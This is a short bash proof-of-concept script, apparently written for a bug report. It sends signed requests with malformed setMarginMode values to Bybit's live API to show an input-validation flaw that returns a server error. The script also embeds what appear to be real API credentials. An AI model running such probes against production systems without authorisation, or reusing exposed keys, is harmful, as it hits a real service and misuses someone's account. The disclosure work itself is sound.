#!/bin/bash
# PoC: Internal Server Error (10016) via set-margin-mode
# Bybit API v5 - Improper Input Validation
# Severity: Low
# Date: 2025-11-25

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL="https://api.bybit.com"

# Get server timestamp
get_timestamp() {
    curl -s "$BASE_URL/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4
}

# Generate HMAC signature
sign_request() {
    local ts=$1
    local payload=$2
    echo -n "${ts}${API_KEY}5000${payload}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}'
}

echo "========================================"
echo "PoC: Bybit API Internal Server Error"
echo "Endpoint: /v5/account/set-margin-mode"
echo "========================================"
echo ""

# Test with invalid values
test_values=("-1" "-999" "abc" "null" "NaN" "undefined")

for val in "${test_values[@]}"; do
    ts=$(get_timestamp)000
    payload="{\"setMarginMode\":\"$val\"}"
    sign=$(sign_request "$ts" "$payload")
    
    echo "Testing setMarginMode='$val':"
    response=$(curl -s -X POST "$BASE_URL/v5/account/set-margin-mode" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sign" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$payload")
    
    echo "  Response: $response"
    echo ""
done

echo "========================================"
echo "Expected: 10001 (Illegal parameter)"
echo "Actual: 10016 (Server error)"
echo "========================================"
echo ""
echo "Impact: Server fails to validate input properly,"
echo "triggering internal exception instead of returning"
echo "appropriate error code. This indicates input"
echo "reaches backend code without sanitization."
